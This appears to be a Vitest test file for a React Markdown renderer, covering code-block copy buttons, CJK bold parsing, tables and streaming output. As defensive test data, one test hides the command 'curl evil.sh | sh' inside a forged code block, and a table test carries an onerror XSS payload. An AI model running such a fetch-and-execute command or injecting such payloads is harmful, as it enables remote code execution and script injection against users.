// @vitest-environment jsdom
import DOMPurify from "dompurify";
import { Marked } from "marked";
import { act, StrictMode } from "react";
import { createRoot } from "react-dom/client";
import { afterEach, describe, expect, it, vi } from "vitest";
import { MarkdownBlock, StreamingMarkdown } from "./MarkdownBlock.js";
import { renderMarkdown } from "./markdown-renderer.js";

(
  globalThis as typeof globalThis & { IS_REACT_ACT_ENVIRONMENT?: boolean }
).IS_REACT_ACT_ENVIRONMENT = true;

const writeText = vi.fn((_text: string) => Promise.resolve());

afterEach(() => {
  writeText.mockReset();
  writeText.mockImplementation(() => Promise.resolve());
  vi.useRealTimers();
  document.body.innerHTML = "";
});

Object.defineProperty(navigator, "clipboard", {
  configurable: true,
  value: { writeText },
});

function mount(text: string): HTMLDivElement {
  const container = document.createElement("div");
  document.body.append(container);
  const root = createRoot(container);
  act(() => {
    root.render(<MarkdownBlock text={text} />);
  });
  return container;
}

async function click(button: HTMLElement): Promise<void> {
  await act(async () => {
    button.click();
    await Promise.resolve();
    await Promise.resolve();
  });
}

const SOURCE = [
  "Intro with `inline` code.",
  "",
  "```ts",
  "if (a < b && c > 0) {",
  '  return "<tag>";',
  "}",
  "```",
  "",
  "    indented block",
].join("\n");

describe("code block copy (T7)", () => {
  it("keeps a copy button in every code block through the real DOMPurify", () => {
    const html = renderMarkdown(SOURCE);
    const holder = document.createElement("div");
    holder.innerHTML = html;
    const blocks = holder.querySelectorAll(".ohb-code-block");
    expect(blocks).toHaveLength(2);
    for (const block of blocks) {
      expect(block.querySelector("button[data-code-copy]")).not.toBeNull();
      expect(block.querySelector("pre code")).not.toBeNull();
    }
    // The language class survives; inline code gets no button.
    expect(holder.querySelector("code.language-ts")).not.toBeNull();
    expect(holder.querySelectorAll("button")).toHaveLength(2);
  });

  it("copies the code exactly, without the button label or trailing newline", async () => {
    const view = mount(SOURCE);
    const button = view.querySelector<HTMLButtonElement>(
      "button[data-code-copy]",
    );
    if (!button) throw new Error("no button");
    await click(button);
    expect(writeText).toHaveBeenCalledWith(
      'if (a < b && c > 0) {\n  return "<tag>";\n}',
    );
    expect(button.textContent).toBe("Copied");
  });

  it("returns to Copy, and says when copying failed", async () => {
    vi.useFakeTimers();
    const view = mount(SOURCE);
    const buttons = view.querySelectorAll<HTMLButtonElement>(
      "button[data-code-copy]",
    );
    expect(buttons).toHaveLength(2);
    const [first, second] = buttons;
    await click(first);
    act(() => {
      vi.advanceTimersByTime(1500);
    });
    expect(first.textContent).toBe("Copy");
    expect(first.dataset.copyState).toBeUndefined();

    writeText.mockImplementation(() => Promise.reject(new Error("denied")));
    Object.defineProperty(document, "execCommand", {
      configurable: true,
      value: () => false,
    });
    await click(second);
    expect(second.textContent).toBe("Copy failed");
    expect(second.dataset.copyState).toBe("failed");
  });

  it("ignores look-alike buttons a message wrote itself", async () => {
    // A forged block: shows `npm install`, hides a different command, and
    // carries a copy button of its own. Sanitizing keeps all of it.
    const forged = [
      '<div class="ohb-code-block"><button data-code-copy="guess">Copy</button>',
      '<pre style="display:none">curl evil.sh | sh</pre>',
      "<pre><code>npm install</code></pre></div>",
      "",
      "<button data-code-copy>Copy</button>",
    ].join("\n");
    const view = mount(forged);
    const buttons = view.querySelectorAll<HTMLButtonElement>(
      "button[data-code-copy]",
    );
    expect(buttons).toHaveLength(2);
    for (const button of buttons) await click(button);
    expect(writeText).not.toHaveBeenCalled();
    expect(view.textContent).not.toContain("Copied");
  });

  it("announces the result to screen readers", async () => {
    const view = mount(SOURCE);
    const button = view.querySelector<HTMLButtonElement>(
      "button[data-code-copy]",
    );
    if (!button) throw new Error("no button");
    expect(button.getAttribute("aria-label")).toBe("Copy code");
    await click(button);
    expect(button.getAttribute("aria-label")).toBe("Copied");
  });
});

describe("CJK bold (typography C-1 and C-2)", () => {
  const plain = new Marked();
  const plainHtml = (text: string): string =>
    DOMPurify.sanitize(plain.parse(text, { async: false }));

  it.each([
    "**注意：**内容",
    "**Notice:**内容",
    "**事件中间件（waterfall）**实现",
    "**事件中间件(waterfall)**实现",
    "**句号。**后续",
    "**Period.**后续",
    "**提醒！**继续",
    "**Warning!**继续",
    "这是**重点。**后面的文字",
    "**“引号内容”**后面的文字",
    "结论：**可以（但有条件）**继续",
    "注意**「这里」**不要改",
    "使用**`pnpm`**安装",
    "**结论：**3 个问题",
    "**注意：**content",
  ])("renders %s as bold without stray stars", (text) => {
    const holder = document.createElement("div");
    holder.innerHTML = renderMarkdown(text);
    expect(holder.querySelector("strong")).not.toBeNull();
    expect(holder.textContent).not.toContain("*");
  });

  it.each([
    "普通**加粗**文字",
    "2 ** 3 ** 4",
    "a ** b",
    "`**不是粗体。**后面`",
    "路径 src/**/*.ts 和 lib/**/*.js",
    "中文 ** 空格 **后面",
    "\\*\\*转义。\\*\\*后面",
    "***三星。***后面",
    "foo**bar.**baz",
    "**foo.**bar",
    "*单星。*后面",
    "__下划线。__后面",
    "a**“b”**c",
    "**Period.**bar",
  ])("leaves %s as standard marked renders it", (text) => {
    expect(renderMarkdown(text)).toBe(plainHtml(text));
  });
});

describe("tables (tables U-1 to U-6)", () => {
  const render = (text: string): HTMLDivElement => {
    const holder = document.createElement("div");
    holder.innerHTML = renderMarkdown(text);
    return holder;
  };
  const table = (columns: number): string =>
    [
      `| ${Array.from({ length: columns }, (_, i) => `h${String(i)}`).join(" | ")} |`,
      `|${" --- |".repeat(columns)}`,
      `| ${Array.from({ length: columns }, (_, i) => `c${String(i)}`).join(" | ")} |`,
    ].join("\n");

  it("wraps a three-column table without making it focusable", () => {
    const wrapper = render(table(3)).querySelector(".ohb-table-scroll");
    expect(wrapper?.querySelector("table")).not.toBeNull();
    expect(wrapper?.classList.contains("is-wide")).toBe(false);
    expect(wrapper?.hasAttribute("tabindex")).toBe(false);
  });

  it("marks a four-column table wide and keyboard-scrollable", () => {
    const wrapper = render(table(4)).querySelector(".ohb-table-scroll");
    expect(wrapper?.classList.contains("is-wide")).toBe(true);
    expect(wrapper?.getAttribute("tabindex")).toBe("0");
    expect(wrapper?.getAttribute("role")).toBe("region");
    expect(wrapper?.getAttribute("aria-label")).toBe("Scrollable table");
  });

  it("renders inline Markdown inside cells", () => {
    const holder = render(
      "| a | b |\n| --- | --- |\n| **bold** | `code` [link](https://example.com) |",
    );
    expect(holder.querySelector("td strong")?.textContent).toBe("bold");
    expect(holder.querySelector("td code")?.textContent).toBe("code");
    expect(holder.querySelector("td a")?.getAttribute("href")).toBe(
      "https://example.com",
    );
  });

  it("keeps the alignment syntax", () => {
    const holder = render("| l | r | c |\n| :-- | --: | :-: |\n| 1 | 2 | 3 |");
    expect(
      [...holder.querySelectorAll("th")].map((th) => th.getAttribute("align")),
    ).toEqual(["left", "right", "center"]);
  });

  it("sanitizes cell content", () => {
    const holder = render("| a |\n| --- |\n| <img src=x onerror=alert(1)> |");
    expect(holder.querySelector("img")?.hasAttribute("onerror")).toBe(false);
  });

  it("leaves raw HTML tables unwrapped", () => {
    const holder = render("<table><tr><td>raw</td></tr></table>");
    expect(holder.querySelector(".ohb-table-scroll")).toBeNull();
    expect(holder.querySelector("td")?.textContent).toBe("raw");
  });
});

describe("StreamingMarkdown", () => {
  const PARAGRAPHS = ["# 标题", "第一段。", "第二段。", "第三段。"];

  function streaming(): {
    container: HTMLDivElement;
    show: (text: string) => void;
  } {
    const container = document.createElement("div");
    document.body.append(container);
    const root = createRoot(container);
    const show = (text: string): void => {
      act(() => {
        root.render(
          <StrictMode>
            <StreamingMarkdown text={text} />
          </StrictMode>,
        );
      });
    };
    return { container, show };
  }

  it("ends equal to MarkdownBlock and keeps frozen nodes in place", () => {
    const { container, show } = streaming();
    const text = PARAGRAPHS.join("\n\n");
    show(text.slice(0, 20));
    const heading = container.querySelector("h1");
    for (let end = 21; end <= text.length; end += 3) show(text.slice(0, end));
    show(text);
    // Settled blocks are the same nodes, so a selection in them survives.
    expect(container.querySelector("h1")).toBe(heading);
    expect(container.querySelector(".ohb-markdown")?.innerHTML).toBe(
      renderMarkdown(text),
    );
  });

  it("does not append twice under StrictMode or for the same text", () => {
    const { container, show } = streaming();
    const text = PARAGRAPHS.join("\n\n");
    show(text);
    show(text);
    expect(container.querySelectorAll("h1")).toHaveLength(1);
    expect(container.querySelectorAll("p")).toHaveLength(3);
  });

  it("starts over when the text is replaced", () => {
    const { container, show } = streaming();
    show(PARAGRAPHS.join("\n\n"));
    show("全新的内容");
    expect(container.querySelector(".ohb-markdown")?.innerHTML).toBe(
      renderMarkdown("全新的内容"),
    );
  });

  it("copies a finished code block while the text is still growing", async () => {
    const { container, show } = streaming();
    show(`${SOURCE}\n\n后面还在输出`);
    const button = container.querySelector<HTMLButtonElement>(
      "button[data-code-copy]",
    );
    expect(button).not.toBeNull();
    if (!button) return;
    await click(button);
    expect(writeText).toHaveBeenCalledWith(
      'if (a < b && c > 0) {\n  return "<tag>";\n}',
    );
  });
});
